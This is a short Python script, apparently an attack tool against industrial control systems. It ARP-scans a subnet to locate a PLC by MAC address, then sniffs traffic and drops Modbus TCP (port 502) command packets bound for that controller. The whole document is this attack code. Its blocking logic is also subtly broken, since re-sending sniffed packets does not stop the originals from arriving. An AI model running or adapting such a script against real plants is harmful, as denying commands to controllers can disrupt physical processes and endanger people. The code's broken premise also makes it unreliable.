import scapy.all as scapy
import netifaces as ni
import time

# Function to discover the PLC's IP address
def discover_plc_ip(interface):
    # Send an ARP request to discover devices on the network
    arp_request = scapy.ARP(pdst="192.168.1.0/24")  # Adjust the subnet as needed
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Filter the responses to find the PLC
    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        print(f"IP: {ip}, MAC: {mac}")
        # Add a condition to identify the PLC (e.g., based on MAC address or IP)
        if mac == "00:11:22:33:44:55":  # Replace with the actual PLC MAC address
            return ip
    return None

# Function to block command messages
def block_command_messages(plc_ip, interface):
    def packet_callback(packet):
        if packet.haslayer(scapy.IP) and packet[scapy.IP].dst == plc_ip:
            if packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 502:  # Modbus TCP port
                print(f"Blocking command message to {plc_ip}")
                return
        scapy.sendp(packet, iface=interface)

    # Start sniffing the network
    scapy.sniff(iface=interface, prn=packet_callback, store=0)

# Main function
def main():
    # Get the network interface
    interfaces = ni.interfaces()
    if "eth0" in interfaces:  # Adjust the interface name as needed
        interface = "eth0"
    else:
        print("Interface eth0 not found. Please specify the correct interface.")
        return

    # Discover the PLC's IP address
    plc_ip = discover_plc_ip(interface)
    if plc_ip is None:
        print("PLC not found on the network.")
        return

    print(f"PLC found at IP: {plc_ip}")

    # Block command messages to the PLC
    block_command_messages(plc_ip, interface)

if __name__ == "__main__":
    main()